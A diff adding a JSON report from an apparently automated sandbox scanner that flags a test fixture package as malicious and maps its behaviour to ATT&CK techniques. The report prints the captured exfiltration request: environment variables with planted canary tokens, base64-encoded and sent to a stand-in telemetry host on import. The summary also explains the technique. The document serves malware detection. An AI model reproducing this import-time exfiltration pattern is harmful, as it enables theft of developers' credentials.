@@ -1,0 +1,525 @@
+{
+  "job": "f4e0ab3ba1",
+  "target": "D:\\createos-stripe-hackathon\\fixtures\\env-b64-exfil",
+  "target_kind": "package",
+  "sha256": "233c5b3004a02b560756baf9fd70e64a14890a80f0fc4a1b5a543479eea46073",
+  "created_at": "2026-10-17T22:54:47+00:00",
+  "verdict": "malicious",
+  "score": 96,
+  "confidence": "high",
+  "findings": [
+    {
+      "id": "gate_exit",
+      "title": "Exited quickly without behaviour; may be gated",
+      "severity": "low",
+      "proof": "signal",
+      "attack": [
+        {
+          "id": "T1497",
+          "name": "Virtualization/Sandbox Evasion",
+          "url": "https://attack.mitre.org/techniques/T1497/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 0,
+          "event_index": 0,
+          "excerpt": "gate_exit"
+        }
+      ]
+    },
+    {
+      "id": "outbound",
+      "title": "Outbound network attempt to non-registry host",
+      "severity": "medium",
+      "proof": "signal",
+      "attack": [
+        {
+          "id": "T1071.001",
+          "name": "Web Protocols",
+          "url": "https://attack.mitre.org/techniques/T1071/001/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 0,
+          "event_index": 1,
+          "excerpt": "dns_query:telemetry-sync-service.example"
+        },
+        {
+          "round": 0,
+          "event_index": 2,
+          "excerpt": "dns_query:telemetry-sync-service.example"
+        },
+        {
+          "round": 1,
+          "event_index": 0,
+          "excerpt": "dns_query:telemetry-sync-service.example"
+        },
+        {
+          "round": 1,
+          "event_index": 1,
+          "excerpt": "dns_query:telemetry-sync-service.example"
+        },
+        {
+          "round": 1,
+          "event_index": 2,
+          "excerpt": "sink_request:telemetry-sync-service.example canaries=SNDTRP-36b74f1e-AWS,SNDTRP-36b74f1e-ENV,SNDTRP-36b74f1e-NPM"
+        }
+      ]
+    },
+    {
+      "id": "canary_exfil",
+      "title": "Canary credentials exfiltrated",
+      "severity": "high",
+      "proof": "proof",
+      "attack": [
+        {
+          "id": "T1041",
+          "name": "Exfiltration Over C2 Channel",
+          "url": "https://attack.mitre.org/techniques/T1041/"
+        },
+        {
+          "id": "T1552.001",
+          "name": "Credentials In Files",
+          "url": "https://attack.mitre.org/techniques/T1552/001/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 1,
+          "event_index": 2,
+          "excerpt": "sink_request:telemetry-sync-service.example canaries=SNDTRP-36b74f1e-AWS,SNDTRP-36b74f1e-ENV,SNDTRP-36b74f1e-NPM"
+        }
+      ]
+    },
+    {
+      "id": "lure_only",
+      "title": "Behaviour only appears under lure (sandbox evasion)",
+      "severity": "high",
+      "proof": "proof",
+      "attack": [
+        {
+          "id": "T1497",
+          "name": "Virtualization/Sandbox Evasion",
+          "url": "https://attack.mitre.org/techniques/T1497/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 1,
+          "event_index": 2,
+          "excerpt": "sink_request:telemetry-sync-service.example canaries=SNDTRP-36b74f1e-AWS,SNDTRP-36b74f1e-ENV,SNDTRP-36b74f1e-NPM"
+        }
+      ]
+    }
+  ],
+  "static_findings": [],
+  "rounds": [
+    {
+      "probe": {
+        "round": -1,
+        "label": "install",
+        "env": {},
+        "lure": false,
+        "sink_reply": "{\"ok\": true}",
+        "clock_offset_days": 0,
+        "driver_code": "",
+        "timeout_s": 45
+      },
+      "exit_code": 0,
+      "stdout": "Processing ./root/work/pkg\n  Installing build dependencies: started\n  Installing build dependencies: finished with status 'done'\n  Getting requirements to build wheel: started\n  Getting requirements to build wheel: finished with status 'done'\n  Preparing metadata (pyproject.toml): started\n  Preparing metadata (pyproject.toml): finished with status 'done'\nBuilding wheels for collected packages: env-b64-exfil\n  Building wheel for env-b64-exfil (pyproject.toml): started\n  Building wheel for env-b64-exfil (pyproject.toml): finished with status 'done'\n  Created wheel for env-b64-exfil: filename=env_b64_exfil-0.1.0-py3-none-any.whl size=1594 sha256=772b1b1a9a13bfe1db48f9f3bfcfc9b0532096d055ccd9582d78edf3d474e070\n  Stored in directory: /tmp/pip-ephem-wheel-cache-bbr7k66h/wheels/13/25/4d/8bd974f2a5e81e37fcc7c028cb3bf8fa1d4ca10e8b1484c5b0\nSuccessfully built env-b64-exfil\nInstalling collected packages: env-b64-exfil\nSuccessfully installed env-b64-exfil-0.1.0\n",
+      "stderr": "",
+      "events": [
+        {
+          "t": 0.381,
+          "pid": 654,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.382,
+          "pid": 654,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "bash",
+              "/usr/local/bin/rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.386,
+          "pid": 654,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "asdf",
+              "exec",
+              "rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.398,
+          "pid": 660,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "env",
+              "-0"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.41,
+          "pid": 654,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/.asdf/installs/rust/1.83.0/toolchains/1.83.0-x86_64-unknown-linux-gnu/bin/rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.452,
+          "pid": 663,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/work/venv/bin/python3",
+              "/root/work/venv/lib/python3.13/site-packages/pip/__pip-runner__.py",
+              "install",
+              "--ignore-installed",
+              "--no-user",
+              "--prefix",
+              "/tmp/pip-build-env-mf6g2hxb/overlay",
+              "--no-warn-script-location",
+              "--disable-pip-version-check",
+              "--no-compile",
+              "--target",
+              ""
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.821,
+          "pid": 665,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "uname",
+              "-rs"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.83,
+          "pid": 666,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.831,
+          "pid": 666,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "bash",
+              "/usr/local/bin/rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.835,
+          "pid": 666,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "asdf",
+              "exec",
+              "rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.847,
+          "pid": 672,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "env",
+              "-0"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.857,
+          "pid": 666,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/.asdf/installs/rust/1.83.0/toolchains/1.83.0-x86_64-unknown-linux-gnu/bin/rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 1.33,
+          "pid": 676,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/work/venv/bin/python3",
+              "/root/work/venv/lib/python3.13/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py",
+              "get_requires_for_build_wheel",
+              "/tmp/tmpun5pggu9"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 1.743,
+          "pid": 677,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/work/venv/bin/python3",
+              "/root/work/venv/lib/python3.13/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py",
+              "prepare_metadata_for_build_wheel",
+              "/tmp/tmp6k9f8hqq"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 2.002,
+          "pid": 678,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/work/venv/bin/python3",
+              "/root/work/venv/lib/python3.13/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py",
+              "build_wheel",
+              "/tmp/tmpm7jxa7rx"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        }
+      ],
+      "duration_ms": 0,
+      "sandbox_id": "sb-01m5615fpngmwh8mgv7nvtcaj1",
+      "error": ""
+    },
+    {
+      "probe": {
+        "round": 0,
+        "label": "baseline",
+        "env": {},
+        "lure": false,
+        "sink_reply": "{\"ok\": true}",
+        "clock_offset_days": 0,
+        "driver_code": "import importlib, sys, traceback\nfor name in ['envdump']:\n    try:\n        importlib.import_module(name)\n        print('imported', name)\n    except Exception:\n        print('import-error', name); traceback.print_exc()\n",
+        "timeout_s": 45
+      },
+      "exit_code": 0,
+      "stdout": "imported envdump\n",
+      "stderr": "",
+      "events": [
+        {
+          "t": 0.123,
+          "pid": 0,
+          "kind": "gate_exit",
+          "data": {
+            "reason": "exited 0 after 0.1s with no observable behaviour"
+          },
+          "round": 0
+        },
+        {
+          "t": 0.172,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "telemetry-sync-service.example",
+            "answered": false
+          },
+          "round": 0
+        },
+        {
+          "t": 0.172,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "telemetry-sync-service.example",
+            "answered": false
+          },
+          "round": 0
+        }
+      ],
+      "duration_ms": 1361,
+      "sandbox_id": "sb-01m5615fpngmwh8mgv7nvtcaj1",
+      "error": ""
+    },
+    {
+      "probe": {
+        "round": 1,
+        "label": "probe-1",
+        "env": {},
+        "lure": true,
+        "sink_reply": "{\"ok\": true}",
+        "clock_offset_days": 0,
+        "driver_code": "import importlib, sys, traceback\nfor name in ['envdump']:\n    try:\n        importlib.import_module(name)\n        print('imported', name)\n    except Exception:\n        print('import-error', name); traceback.print_exc()\n",
+        "timeout_s": 45
+      },
+      "exit_code": 0,
+      "stdout": "imported envdump\n",
+      "stderr": "",
+      "events": [
+        {
+          "t": 0.171,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "telemetry-sync-service.example",
+            "answered": true
+          },
+          "round": 1
+        },
+        {
+          "t": 0.172,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "telemetry-sync-service.example",
+            "answered": false
+          },
+          "round": 1
+        },
+        {
+          "t": 0.172,
+          "pid": 0,
+          "kind": "sink_request",
+          "data": {
+            "host": "telemetry-sync-service.example",
+            "method": "GET",
+            "path": "/api/v1/ping?d=eyJQV0QiOiAiL3Jvb3Qvd29yayIsICJIT01FIjogIi9yb290IiwgIkdJVEhVQl9UT0tFTiI6ICJnaHBfU05EVFJQLTM2Yjc0ZjFlLUVOViIsICJBV1NfU0VDUkVUX0FDQ0VTU19LRVkiOiAiU05EVFJQLTM2Yjc0ZjFlLUFXUy9mYWtlLXNlY3JldC1ub3QtcmVhbCIsICJURVJNIjogImxpbnV4IiwgIlNITFZMIjogIjEiLCAib3ZlcmxheV9yb290IjogInZkYiIsICJQQVRIIjogIi91c3IvbG9jYWwvc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL3NiaW46L3Vzci9iaW46L3NiaW46L2JpbiIsICJOUE1fVE9LRU4iOiAibnBtX1NORFRSUC0zNmI3NGYxZS1OUE0iLCAiXyI6ICIvdXNyL2Jpbi9zdHJhY2UiLCAiT0xEUFdEIjogIi8iLCAiTENfQ1RZUEUiOiAiQy5VVEYtOCJ9",
+            "body": "",
+            "canaries": [
+              "SNDTRP-36b74f1e-AWS",
+              "SNDTRP-36b74f1e-ENV",
+              "SNDTRP-36b74f1e-NPM"
+            ],
+            "orig_dst": ""
+          },
+          "round": 1
+        }
+      ],
+      "duration_ms": 1366,
+      "sandbox_id": "sb-01m5615fpngmwh8mgv7nvtcaj1",
+      "error": ""
+    }
+  ],
+  "baseline_only": [],
+  "lure_only": [
+    "sink_request:telemetry-sync-service.example"
+  ],
+  "hypotheses": [
+    "The package exfiltrates environment variables to telemetry-sync-service.example when lure=True"
+  ],
+  "summary": "The `envdump` package collects all environment variables, base64-encodes them, and exfiltrates them via a GET request to `http://telemetry-sync-service.example/api/v1/ping?d=<base64_blob>` upon import. This behavior mimics the hijacked `ctx` PyPI package. When tested with `lure=True`, the package successfully exfiltrated environment variables containing planted canary credentials (such as AWS, NPM, and GitHub tokens).",
+  "attempts": [
+    {
+      "round": 0,
+      "label": "baseline",
+      "exit_code": 0,
+      "note": "default import driver"
+    },
+    {
+      "round": 1,
+      "label": "probe-1",
+      "exit_code": 0,
+      "note": "The package exfiltrates environment variables to telemetry-sync-service.example when lure=True"
+    }
+  ],
+  "egress_timeline": [
+    {
+      "phase": "create",
+      "rules": [
+        "pypi.org:443",
+        "files.pythonhosted.org:443",
+        "registry.npmjs.org:443"
+      ],
+      "note": "sandbox sb-01m5615fpngmwh8mgv7nvtcaj1"
+    },
+    {
+      "phase": "analysis",
+      "rules": [
+        "192.0.2.1:9"
+      ],
+      "note": "registry access closed; lure runs on loopback only"
+    }
+  ],
+  "patch_diff": "",
+  "remediation": "",
+  "capture_method": "strace",
+  "model": "gemini-3.5-flash",
+  "llm_calls": 4,
+  "sandbox_ids": [
+    "sb-01m5615fpngmwh8mgv7nvtcaj1"
+  ],
+  "destroyed": true,
+  "limitations": [
+    "Dynamic analysis runs on Linux only; Windows executables are not executed.",
+    "HTTPS request bodies cannot be read without interception: TLS destinations are recorded by SNI only.",
+    "Evasive code that detects tracing or waits longer than the probe timeout may look quiet; such runs are reported as inconclusive, never clean.",
+    "Canary proof covers the credential types we plant (ssh key, aws, npm, .env)."
+  ],
+  "report_url": "",
+  "intel": [],
+  "used_skills": [],
+  "learned_skills": [],
+  "threat_brief": "",
+  "from_cache": false
+}
